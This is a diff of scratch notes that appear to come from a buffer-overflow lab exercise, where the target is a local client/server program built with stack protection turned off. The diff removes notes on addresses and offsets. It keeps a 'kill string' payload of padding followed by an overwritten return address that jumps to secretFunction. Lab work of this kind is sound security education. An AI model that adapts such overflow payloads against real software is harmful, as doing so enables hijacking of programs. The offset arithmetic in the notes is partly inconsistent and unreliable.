@@ -3,16 +3,6 @@ gcc -g client.c -o client -fno-stack-protector
 ./server 9000 ADD GDB WHEN NECESSARY
 ./client 127.0.0.1 ADD GDB WHEN NECESSARY
 
-Memory location for the entry into the object code for secretFunction: 000016de MAYBE 000016da
-Distance from clientComm to secretFunc??? 
-clientComm leave address: 000016d8
-return address of the stack frame in clientComm: 0xffffdd08 -> 0x7fffffffdca8
 
-Format of breaking string: (#A's given by difference from address of str in strcpy to rbp)(rbp of secretFunction backwards)
-rbp of secret: 555556de
-
-dccb -> 56523
-dce0 -> 56544
-Diff = 21 + 8 = 29
 Kill string: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18\x0e\x40\x00
 555556da
